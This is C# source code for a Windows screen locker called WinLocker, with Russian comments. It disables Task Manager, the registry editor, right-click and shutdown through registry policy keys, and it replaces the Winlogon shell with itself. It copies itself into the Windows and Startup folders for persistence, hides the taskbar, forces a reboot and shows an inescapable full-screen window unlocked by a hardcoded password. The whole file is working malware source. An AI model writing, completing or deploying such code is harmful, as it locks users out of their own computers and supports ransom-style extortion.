using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace WinLocker
{
    public partial class winlocker : Form
    {
        private static class TaskBar
        {
            [DllImport("user32.dll")]
            private static extern int FindWindow(string className, string windowText);

            [DllImport("user32.dll")]
            private static extern int ShowWindow(int hwnd, int command);

            private const int SW_HIDE = 0;
            private const int SW_SHOW = 1;

            private static int Handle => FindWindow("Shell_TrayWnd", "");
            private static int StartHandle => FindWindow("Button", "Пуск");
            private static void HideTaskBar() => ShowWindow(Handle, SW_HIDE);
            private static void HideStartButton() => ShowWindow(StartHandle, SW_HIDE);
            private static void ShowTaskBar() => ShowWindow(Handle, SW_SHOW);
            private static void ShowStartButton() => ShowWindow(StartHandle, SW_SHOW);

            #region Control
            public static void Lock()
            {
                HideTaskBar();
                HideStartButton();
            }
            public static void Unlock()
            {
                ShowTaskBar();
                ShowStartButton();
            }
            #endregion
        }
        private static class Rebooting
        {
            public static void Lock()
            {
                RegistryKey reg;
                string key = "1";
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";

                reg = Registry.LocalMachine.OpenSubKey(sub, true);
                reg.SetValue("NoClose", key, RegistryValueKind.DWord);
                reg.Close();
            }

            public static void Unlock()
            {
                RegistryKey reg;
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";

                reg = Registry.LocalMachine.OpenSubKey(sub, true);
                reg.DeleteValue("NoClose");
                reg.Close();
            }
        }

        private static class Right_click
        {
            #region Control
            public static void Lock()
            {
                RegistryKey reg;
                string key = "1";
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";

                reg = Registry.LocalMachine.CreateSubKey(sub);
                reg.SetValue("NoViewContextMenu", key);
                reg.Close();

            }
            public static void Unlock()
            {
                RegistryKey reg;
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";

                reg = Registry.LocalMachine.OpenSubKey(sub, true);
                reg.DeleteValue("NoViewContextMenu");
                reg.Close();
            }
            #endregion
        }

        private class Registry_editor
        {
            public static void Lock()
            {
                RegistryKey reg;
                string key = "1";
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

                reg = Registry.CurrentUser.CreateSubKey(sub);
                reg.SetValue("DisableRegistryTools", key, RegistryValueKind.DWord);
                reg.Close();
            }
            public static void Unlock()
            {
                RegistryKey reg;
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

                reg = Registry.CurrentUser.OpenSubKey(sub, true);
                reg.DeleteValue("DisableRegistryTools");
                reg.Close();
            }
        }
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SwapMouseButton([param: MarshalAs(UnmanagedType.Bool)] bool fSwap);
        public Screen GetSecondaryScreen()
        {
            if (Screen.AllScreens.Length == 1)
            {
                return null;
            }
            foreach (Screen screen in Screen.AllScreens)
            {
                if (screen.Primary == false)
                {
                    return screen;
                }
            }
            return null;
        }

        private void Show_all_monitors(int a)
        {
            if (a == 2)
            {
                winlocker frm = new winlocker();
                Screen screen = GetSecondaryScreen();
                frm.TopMost = true;
                frm.StartPosition = FormStartPosition.Manual;
                frm.FormBorderStyle = FormBorderStyle.None;
                frm.WindowState = FormWindowState.Maximized;
                frm.Location = screen.WorkingArea.Location;
                frm.Size = new Size(screen.WorkingArea.Width, screen.WorkingArea.Height);
                frm.Show();
            }
        }
        public winlocker()
        {


            Process process = new Process();

            try
            {
                // Путь до ключа реестра для DisableTaskMgr
                string systemPoliciesPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";

                // Путь до ключа реестра для Userinit
                //string winLogonPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";

                // Значение для Userinit
                //string newUserinitValue = @"C:\Windows\system32\userinit.exe,"; // Пример значения

                // Открытие или создание ключа реестра для DisableTaskMgr
                using (RegistryKey systemPoliciesKey = Registry.CurrentUser.OpenSubKey(systemPoliciesPath, true) ?? Registry.CurrentUser.CreateSubKey(systemPoliciesPath))
                {
                    if (systemPoliciesKey != null)
                    {
                        // Установка значения DisableTaskMgr в 0 (включение Диспетчера задач)
                        systemPoliciesKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                        //MessageBox.Show("DisableTaskMgr set to 0 successfully.");
                    }
                    else
                    {
                        MessageBox.Show("Failed to access or create the registry key for DisableTaskMgr.");
                    }
                    try
                    {
                        string registryPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";

                        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath, true))
                        {
                            if (key != null)
                            {
                                // Set the Shell value to explorer1.exe
                                key.SetValue("Shell", "winlocker.exe", RegistryValueKind.String);
                                //MessageBox.Show("Shell has been changed to explorer1.exe.");
                            }
                            else
                            {
                                MessageBox.Show("Could not open the registry key.");
                            }
                        }
                    }
                    catch (UnauthorizedAccessException)
                    {
                        MessageBox.Show("You need to run this application as an administrator.");
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"An error occurred: {ex.Message}");
                    }
                }

                // Открытие ключа реестра для Userinit в разделе HKEY_LOCAL_MACHINE

            }
            catch (UnauthorizedAccessException)
            {
                MessageBox.Show("Error: Administrator privileges are required to modify the registry.");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}");
            }
            string src = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            string dest = "C:\\windows\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName;
            try
            {
                string dest1 = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName;
                System.IO.File.Copy(src, dest1);
            }
            catch (Exception ex) { MessageBox.Show(ex.Message); }
            System.IO.File.Copy(src, dest);
            //SwapMouseButton(true);
            process.StartInfo.FileName = "explorer.exe";
            //System.Threading.Thread.Sleep(2000);
            process.Kill();
            TaskBar.Lock();
            Registry_editor.Lock();
            Right_click.Lock();
            Rebooting.Lock();
            // Execute the shutdown command with the restart (/r) flag
            Process.Start("shutdown", "/r /t 5");


            //Cursor.Hide(); // Скрываем курсор
            // Убираем границы формы
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;
            // Разворачиваем форму на весь экран
            this.WindowState = FormWindowState.Maximized;
            //Cursor.Hide(); // Скрываем курсор
            // Добавляем фон или другие элементы интерфейса
            this.BackColor = System.Drawing.Color.CornflowerBlue; // Устанавливаем цвет фона для примера
            InitializeComponent();
        }
        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            if (keyData == (Keys.Alt | Keys.F4))
            {
                // Игнорируем Alt+F4
                return true;
            }
            if (keyData == (Keys.Alt | Keys.Control | Keys.Delete))
            {
                // Игнорируем CTRL+ALT+DEL
                return true;
            }


            return base.ProcessCmdKey(ref msg, keyData);
        }
        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "label")
            {
                TaskBar.Unlock();
                Registry_editor.Unlock();
                Right_click.Unlock();
                Rebooting.Unlock();
                try
                {
                    // Путь до ключа реестра для DisableTaskMgr
                    string systemPoliciesPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";

                    // Путь до ключа реестра для Userinit
                    //string winLogonPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";

                    // Значение для Userinit
                    //string newUserinitValue = @"C:\Windows\system32\userinit.exe, D:\WinLocker\WinLocker\bin\Debug\WinLocker.exe"; // Пример значения

                    // Открытие или создание ключа реестра для DisableTaskMgr
                    using (RegistryKey systemPoliciesKey = Registry.CurrentUser.OpenSubKey(systemPoliciesPath, true) ?? Registry.CurrentUser.CreateSubKey(systemPoliciesPath))
                    {
                        if (systemPoliciesKey != null)
                        {
                            // Установка значения DisableTaskMgr в 0 (включение Диспетчера задач)
                            systemPoliciesKey.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
                            //MessageBox.Show("DisableTaskMgr set to 0 successfully.");
                        }
                        else
                        {
                            MessageBox.Show("Failed to access or create the registry key for DisableTaskMgr.");
                        }
                    }

                    try
                    {
                        string registryPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";

                        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath, true))
                        {
                            if (key != null)
                            {
                                // Set the Shell value to explorer1.exe
                                key.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
                                //MessageBox.Show("Shell has been changed to explorer1.exe.");
                            }
                            else
                            {
                                MessageBox.Show("Could not open the registry key.");
                            }
                        }
                    }
                    catch (UnauthorizedAccessException)
                    {
                        MessageBox.Show("You need to run this application as an administrator.");
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"An error occurred: {ex.Message}");
                    }
                    // Открытие ключа реестра для Userinit в разделе HKEY_LOCAL_MACHINE

                }
                catch (UnauthorizedAccessException)
                {
                    MessageBox.Show("Error: Administrator privileges are required to modify the registry.");
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"An error occurred: {ex.Message}");
                }
                SwapMouseButton(false);
                string dest = "C:\\windows\\winlocker.exe";
                string dest1 = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\winlocker.exe";
                System.IO.File.Delete(dest);
                System.IO.File.Delete(dest1);
                this.Close();
            }
            else
            {
                MessageBox.Show("Пароль неверный");
            }
            
        }


    }
}